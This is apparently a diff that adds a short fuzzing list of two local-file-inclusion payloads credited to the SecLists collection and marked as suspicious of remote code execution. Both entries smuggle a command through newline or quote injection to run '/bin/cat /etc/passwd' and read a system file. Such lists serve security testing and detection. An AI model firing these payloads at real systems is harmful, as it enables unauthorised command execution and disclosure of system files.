@@ -1,0 +1,5 @@
+# LFI payloads that are RCE-suspicious
+# Copied from MIT-licensed (https://github.com/danielmiessler/SecLists/blob/master/LICENSE)
+# file https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+%0a/bin/cat%20/etc/passwd
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
